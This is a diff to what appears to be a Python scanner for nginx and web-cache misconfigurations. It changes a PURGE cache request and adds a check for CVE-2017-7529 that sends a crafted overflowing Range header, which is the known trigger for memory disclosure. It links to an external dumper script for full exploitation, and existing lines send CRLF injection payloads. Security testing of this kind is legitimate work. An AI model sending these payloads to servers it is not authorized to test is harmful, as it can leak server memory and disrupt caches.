@@ -44,7 +44,7 @@ else:
     print(Fore.GREEN+"[+] No CRLF via common misconfiguration found")
 #p = subprocess.Popen('curl -IL -X PURGE -D - "'+url+'"/* | grep HTTP', shell=True, stdout=subprocess.PIPE)
 #output, _ = p.communicate()
-purgemethod=requests.request("PURGE", url+"/", allow_redirects=True)
+purgemethod=requests.request("PURGE", url+"/*", allow_redirects=True)
 #print(purgemethod.text+str(purgemethod.headers)+str(purgemethod.status_code))
 if purgemethod.status_code == 204:
     print(Fore.RED+"[-] Possibly misconfigured PURGE HTTP method (purges the web cache), test this HTTP method manually")
@@ -206,6 +206,32 @@ for pathline in pathlines:
     uri_crlf_test= requests.get(url+"/"+pathline.strip()+"%0d%0aDetectify:%20clrf")
 if "Detectify" in uri_crlf_test.headers:
     print(Fore.RED+"[-] CRLF injection found via in URL:"+url+"/"+pathline.strip()+" payload: %0d%0aDetectify:%20crlf in URI. If you found any 401 or 403 status code, try injecting X-Accel-Redirect headers in the response or even X-Sendfile")
+
+print(Fore.CYAN+"\n[?] Testing for common integer overflow vulnerability in nginx's range filter module")
+
+def send_http_request(url, headers={}, timeout=8.0):
+    httpResponse   = requests.get(url, headers=headers, timeout=timeout)
+    httpHeaders    = httpResponse.headers
+
+    print("status: %s: Server: %s", httpResponse.status_code, httpHeaders.get('Server', ''))
+    return httpResponse
+
+
+def exploit(url):
+    print("target: %s", url)
+    httpResponse   = send_http_request(url)
+
+    content_length = httpResponse.headers.get('Content-Length', 0)
+    bytes_length   = int(content_length) + 623
+    content_length = "bytes=-%d,-9223372036854%d" % (bytes_length, 776000 - bytes_length)
+
+    httpResponse   = send_http_request(url, headers={ 'Range': content_length })
+    if httpResponse.status_code == 206 and "Content-Range" in httpResponse.text:
+        print(Fore.RED+"\n[+] Vulnerable to CVE-2017-7529, use this to exploit https://github.com/souravbaghz/Scanginx/blob/master/dumper.py")
+    else:
+        print(Fore.GREEN+"\n[+] Non vulnerable")
+
+exploit(url)
 
 print(Fore.CYAN+"\n[?] If the site uses Redis, please do check out: https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/")
 
